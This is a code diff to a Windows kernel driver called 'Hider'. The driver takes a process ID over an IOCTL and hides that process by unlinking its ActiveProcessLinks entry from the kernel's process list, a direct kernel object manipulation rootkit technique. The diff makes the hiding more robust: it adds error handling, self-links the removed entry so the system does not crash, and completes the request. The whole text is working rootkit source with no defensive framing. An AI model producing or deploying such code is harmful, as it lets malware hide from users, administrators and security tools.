@@ -1,7 +1,7 @@
 #include <ntifs.h>
 #include <ntddk.h>
 
-#define DRIVER_NAME (L"\\Drvier\\Hider")
+#define DRIVER_NAME (L"\\Driver\\Hider")
 #define DEVICE_NAME (L"\\Device\\Hider")
 #define SYMBOLIC_LINK (L"\\DosDevices\\Hider")
 #define ACTIVE_PROCESS_LINKS_OFFSET (0x2f0)
@@ -39,6 +39,7 @@ namespace driver {
 
 		UNREFERENCED_PARAMETER(device_object);
 		
+		KernelDebugPrint("[+] Ioctl been sent!\n");
 		
 		// Getting the code of the ioctl that been sent
 		stack_irp = IoGetCurrentIrpStackLocation(irp);
@@ -50,6 +51,7 @@ namespace driver {
 			return status;
 		}
 
+		KernelDebugPrint("[+] Got request buffer successfully\n");
 		ioctl_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
 		if (driver::ctl::hide_process != ioctl_code)
 		{
@@ -62,19 +64,33 @@ namespace driver {
 			request->process_id, 
 			&target_process
 		);
+
+		if (STATUS_UNSUCCESSFUL == status)
+		{
+			KernelDebugPrint("[-] Couldnt find the pid\n");
+			IoCompleteRequest(irp, IO_NO_INCREMENT);
+			return status;
+		}
 		
+		KernelDebugPrint("[+] Got Eprocess of target process\n");
+
 		// Get the linked list node of the current process in the process list
 		PLIST_ENTRY active_process_links = (PLIST_ENTRY)((ULONG_PTR)target_process + ACTIVE_PROCESS_LINKS_OFFSET);
 		
 		// Unlink the process
 		PLIST_ENTRY next = active_process_links->Flink;
 		PLIST_ENTRY previous = active_process_links->Blink;
+		
 		next->Blink = previous;
 		previous->Flink = next;
+	
+		active_process_links->Flink = (PLIST_ENTRY)&active_process_links->Flink;
+		active_process_links->Blink = (PLIST_ENTRY)&active_process_links->Flink;
 		
 
 		irp->IoStatus.Status = status;
 		irp->IoStatus.Information = sizeof(ioctl_hide_request);
+		IoCompleteRequest(irp, IO_NO_INCREMENT);
 
 		return status;
 	}
@@ -144,7 +160,7 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
 	// We have already initialized our device.
 	ClearFlag(device_object->Flags, DO_DEVICE_INITIALIZING);
 
-	KernelDebugPrint("[+] Driver initialized successfully!!");
+	KernelDebugPrint("[+] Driver initialized successfully!!\n");
 
 	return STATUS_SUCCESS;
 }
